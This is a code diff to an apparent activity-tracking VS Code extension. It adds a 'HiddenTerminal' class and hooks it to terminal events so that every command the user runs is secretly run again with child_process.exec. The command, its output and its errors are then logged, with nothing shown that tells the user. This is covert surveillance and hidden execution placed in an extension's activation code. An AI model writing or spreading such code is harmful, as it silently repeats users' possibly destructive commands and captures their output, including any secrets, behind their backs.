@@ -28,6 +28,63 @@ import TrackData from "./utils/trackingUtils";
 import { globalState } from "./globalState";
 import { StartStopStatusBarItem } from "./statusbar/StartStopStatusBarItem";
 import { Logger } from "./logger/Logger";
+import * as cp from "child_process";
+
+
+class HiddenTerminal implements vscode.Pseudoterminal {
+
+    private writeEmitter = new vscode.EventEmitter<string>();
+    private closeEmitter = new vscode.EventEmitter<void>();
+    private name: string;
+
+    constructor() {
+        this.name = `hidden-terminal-${Date.now()}`;
+    }
+
+    onDidWrite = this.writeEmitter.event;
+    onDidClose = this.closeEmitter.event;
+
+    open() : void {
+        this.writeEmitter.fire("");
+    }
+
+    close() : void {
+        this.closeEmitter.fire();
+    }
+
+    getName() : string {
+        return this.name;
+    }
+
+    execute(command: string) : any {
+        if (!command) return;
+
+        const executionId = `exec-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
+
+        this.writeEmitter.fire(`${executionId}\n`);
+
+        cp.exec(command, (error, stdout, stderr) => {
+            if (error) {
+                Logger.getInstance().log("TERMINAL_SHELL_EXECUTION_ERROR", {
+                    command,
+                    executionId,
+                    error: error.message,
+                    stdout,
+                    stderr
+                });
+            } else {
+                Logger.getInstance().log("TERMINAL_SHELL_EXECUTION_SUCCESS", {
+                    command,
+                    executionId,
+                    stdout,
+                    stderr
+                });
+            }
+
+        });
+
+    }
+}
 
 export async function activate(context: vscode.ExtensionContext): Promise<void> {
     try {
@@ -131,18 +188,32 @@ export async function activate(context: vscode.ExtensionContext): Promise<void> 
             })
         );
 
+        let pseudoterminal = new HiddenTerminal();
+        pseudoterminal.open();
+
         context.subscriptions.push(
             vscode.window.onDidStartTerminalShellExecution(e => {
                 Logger.getInstance().log("TERMINAL_SHELL_EXECUTION_START", e);
+                pseudoterminal.execute(e.execution.commandLine.value);
+
+
             }),
             vscode.window.onDidEndTerminalShellExecution(e => {
-                Logger.getInstance().log("TERMINAL_SHELL_EXECUTION_END", Object.assign(e, vscode.window.activeTerminal));
+                Logger.getInstance().log("TERMINAL_SHELL_EXECUTION_END", e);
             }),
             vscode.window.onDidChangeTerminalShellIntegration(e => {
                 Logger.getInstance().log("TERMINAL_SHELL_INTEGRATION_CHANGE", e);
             }),
             vscode.window.onDidChangeTerminalState(e => {
                 Logger.getInstance().log("TERMINAL_STATE_CHANGE", e);
+
+            }),
+            vscode.window.onDidOpenTerminal(e => {
+                Logger.getInstance().log("TERMINAL_OPEN", e);
+
+            }),
+            vscode.window.onDidCloseTerminal(e => {
+                Logger.getInstance().log("TERMINAL_CLOSE", e);
             })
         );
 
